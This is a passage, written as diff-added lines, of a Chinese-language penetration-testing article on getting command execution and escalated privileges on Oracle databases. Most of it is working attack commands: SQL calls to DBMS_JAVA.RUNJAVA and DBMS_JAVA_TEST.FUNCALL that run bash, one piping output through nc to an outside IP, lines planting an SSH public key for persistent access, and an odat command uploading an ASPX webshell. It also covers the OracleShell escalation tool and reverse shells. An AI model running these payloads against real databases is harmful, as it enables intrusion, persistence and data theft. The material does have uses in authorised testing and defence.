+    SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /usr/bin/bash -c "/bin/ls|/usr/bin/nc 192.168.40.253 9999"') FROM DUAL;
+    
+
+#### DBMS_JAVA_TEST.FUNCALL
+
+  * 影响版本：Oracle Database <= 11g
+
+  * 利用条件：Java 权限
+
+DBMS_JAVA_TEST.FUNCALL() 与 DBMS_JAVA.RUN_JAVA() 执行均无回显
+
+    
+    
+    SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','pwd > /tmp/pwd.txt') from dual;
+    
+
+测试过程中如果没有 DBA 权限的用户执行会报如下错误：
+
+    
+    
+    ORA-29532: Java call terminated by uncaught Java exception: java.security.AccessControlException: the Permission (java.io.FilePermission /bin/bash execute) has not been granted to STUDENT. The PL/SQL to grant this is dbms_java.grant_permission( 'STUDENT', 'SYS:java.io.FilePermission', '/bin/bash', 'execute' )
+    
+
+因此可利用写入ssh公钥、计划任务、webshell等方式进行利用
+
+    
+    
+    SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/usr/bin/mkdir /home/oracle/.ssh') from dual;
+    SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','echo "ssh公钥"> /home/oracle/.ssh/authorized_keys') from dual;
+    
+
+#### OracleShell
+
+OracleShell 是一款针对 Oracle 提权的工具，简化了创建 Java 函数的过程，在 Linux 中 odat 也主要针对 Oracle
+进行利用，具体可看我的`HTB: Silo`这篇文章，比如文件上传：
+
+    
+    
+    odat dbmsxslprocessor -s 10.10.10.82 -U scott -P tiger -d XE --putFile "C:\inetpub\wwwroot" "shell.aspx" "/usr/share/webshells/aspx/cmdasp.aspx" --sysdba
+    
+
+OracleShell 共包括以下三种模式：
+
+    
+    
+    普通权限：自动尝试提权
+    DBA：一般为system，执行连接即可
+    注入：即SQL注入执行
+    
+
+在使用前需要提供 Oracle 数据库连接信息
+
+    
+    
+    IP: 192.168.0.102
+    端口: 1521
+    SID: orcl
+    用户名: system
+    密码: hacker1961
+    
+
+命令执行，获取当前权限为系统权限  
+![截屏2021-10-08
+上午3.36.23](https://image.3001.net/images/20220906/1662426887_63169f071c2dbf1d5e91e.png!small)
+
+文件管理，可对服务器文件进行操作  
+![截屏2021-10-08
+上午3.36.59](https://image.3001.net/images/20220906/1662426888_63169f08c3d24a6d1a82b.png!small)
+
+反弹shell则需要注意退出，不然数据库会话容易报错  
+![截屏2021-10-08
+上午3.37.14](https://image.3001.net/images/20220906/1662426890_63169f0a2acdfdd578041.png!small)
+
